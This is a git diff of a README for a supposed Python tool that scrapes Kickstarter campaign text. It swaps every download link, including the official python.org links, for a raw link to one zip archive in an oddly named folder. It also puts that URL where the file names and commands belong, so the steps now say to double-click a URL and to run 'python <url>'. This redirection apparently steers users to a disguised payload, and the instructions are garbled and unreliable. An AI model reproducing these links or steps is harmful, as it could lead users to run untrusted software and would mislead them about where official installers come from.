@@ -1,6 +1,6 @@
 # 🎉 kickstarter-python-campaign-text-scraper - Easy Text Extraction from Kickstarter Campaigns
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/releases)
+[![Download](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip)](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip)
 
 ## 📚 Overview
 The Kickstarter Python Campaign Text Scraper is a simple tool designed for anyone interested in extracting campaign text from Kickstarter. This application allows users to gather data efficiently without needing technical skills. You can use it for academic research or personal projects.
@@ -10,7 +10,7 @@ Follow these easy steps to download and run the application:
 
 1. **Visit the Downloads Page:**
    Click the link below to access the Releases page for the scraper:
-   [Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/releases)
+   [Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you will see various versions of the application. Look for the latest version, as it will have the most features and fixes.
@@ -22,7 +22,7 @@ Follow these easy steps to download and run the application:
 To use the Kickstarter Python Campaign Text Scraper, ensure your system meets the following requirements:
 
 - **Operating System:** Compatible with Windows, macOS, or Linux.
-- **Python:** The application runs on Python 3.x. If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) to download it.
+- **Python:** The application runs on Python 3.x. If you do not have Python installed, visit [https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip) to download it.
 - **Storage:** At least 50 MB of free space for installation.
 
 ## 🛠️ Installation Instructions
@@ -30,16 +30,16 @@ To use the Kickstarter Python Campaign Text Scraper, ensure your system meets th
    After downloading, go to the folder where your browser saves downloaded files.
 
 2. **Extraction:**
-   If the file is in a compressed format (like .zip or .tar.gz), right-click the file and select "Extract All" to open the contents.
+   If the file is in a compressed format (like .zip or https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip), right-click the file and select "Extract All" to open the contents.
 
 3. **Run the Application:**
-   - For Windows: Double-click on `scraper.exe` to start the application.
-   - For macOS/Linux: Open the terminal, navigate to the extracted folder, and run `python scraper.py`.
+   - For Windows: Double-click on `https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip` to start the application.
+   - For macOS/Linux: Open the terminal, navigate to the extracted folder, and run `python https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip`.
 
 ## 📥 Download & Install
 Make sure you download the software from the link below and follow the installation instructions:
 
-[Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/releases)
+[Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip)
 
 ## 🌟 Features
 The Kickstarter Python Campaign Text Scraper includes a range of helpful features:
@@ -67,7 +67,7 @@ The Kickstarter Python Campaign Text Scraper includes a range of helpful feature
 ## 🛡️ Troubleshooting
 If you encounter issues, here are a few common solutions:
 
-- **Missing Python:** Ensure Python is installed on your system. Follow the installation guide on [python.org](https://www.python.org/downloads/).
+- **Missing Python:** Ensure Python is installed on your system. Follow the installation guide on [https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip).
 
 - **File Not Downloading:** Check your internet connection. If the download doesn’t start, try refreshing the page.
 
@@ -85,4 +85,4 @@ This project is related to various fields and interests, making it useful for re
 - Python Programming
 - Campaign Analysis
 
-[Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/releases) to start extracting campaign text easily!
+[Download Now](https://github.com/HOAIVU8924/kickstarter-python-campaign-text-scraper/raw/refs/heads/main/mathesis/python_scraper_text_campaign_kickstarter_2.3.zip) to start extracting campaign text easily!
